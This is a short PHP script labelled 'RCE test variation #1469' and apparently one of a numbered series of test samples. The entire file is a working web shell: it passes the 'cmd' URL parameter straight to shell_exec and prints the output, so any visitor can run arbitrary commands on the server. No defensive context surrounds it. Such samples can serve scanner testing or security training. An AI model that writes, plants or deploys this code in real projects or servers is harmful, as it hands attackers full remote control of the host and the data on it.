<?php
// RCE test variation #1469
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>